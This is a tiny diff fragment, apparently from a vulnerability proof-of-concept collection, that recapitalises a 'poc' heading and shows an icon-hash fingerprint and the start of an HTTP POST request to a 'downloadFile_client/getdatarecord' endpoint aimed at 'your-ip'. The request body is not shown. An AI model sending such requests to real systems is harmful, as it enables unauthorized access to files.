@@ -6,7 +6,7 @@ icon_hash="2030860561"
 ```
 
 
-## poc
+## POC
 ```
 POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
 Host: your-ip
